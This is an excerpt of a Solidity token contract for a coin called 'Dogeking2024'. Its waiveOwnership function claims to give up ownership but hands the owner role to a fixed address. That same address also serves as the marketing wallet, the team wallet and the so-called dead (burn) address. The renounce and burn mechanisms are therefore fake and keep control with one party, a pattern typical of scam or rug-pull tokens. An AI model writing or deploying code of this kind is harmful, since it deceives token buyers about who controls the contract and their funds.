...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xcd273b94BF9C5Fd4c5BebAeE1c05c281F70ac422));
        _owner = address(0xcd273b94BF9C5Fd4c5BebAeE1c05c281F70ac422);
    }
...
contract Dogeking2024 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Dogeking2024";
    string private _symbol = "Dogeking2024";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xcd273b94BF9C5Fd4c5BebAeE1c05c281F70ac422);
    address payable public teamWalletAddress = payable(0xcd273b94BF9C5Fd4c5BebAeE1c05c281F70ac422);
    address public immutable deadAddress = 0xcd273b94BF9C5Fd4c5BebAeE1c05c281F70ac422;
